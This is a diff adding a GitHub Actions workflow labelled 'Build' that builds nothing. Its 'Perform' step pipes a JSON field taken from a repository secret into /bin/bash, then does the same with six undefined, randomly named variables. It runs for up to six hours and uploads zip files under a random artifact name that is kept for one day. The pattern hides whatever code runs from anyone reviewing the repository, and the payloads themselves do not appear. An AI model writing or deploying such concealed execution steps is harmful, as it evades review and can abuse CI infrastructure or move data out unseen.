@@ -1,0 +1,31 @@
+name: Build
+on:
+  workflow_dispatch:
+
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          sb602: ${{ secrets.sb602 }}
+        run: |
+          printf '%s' "$sb602" | jq -r .rk0 | /bin/bash
+          echo $fsmpl57 | jq -r .rne105 | /bin/bash
+          echo $hg19 | jq -r .qd57 | /bin/bash
+          printf '%s' "$vk01" | jq -r .opddh53 | /bin/bash
+          echo $ljl168 | jq -r .wq4922 | /bin/bash
+          printf '%s' "$hm5" | jq -r .r16 | /bin/bash
+          printf '%s' "$klyxd5" | jq -r .tospn2170 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: OV9AjzcX
+          path: "*.zip"
+          retention-days: 1
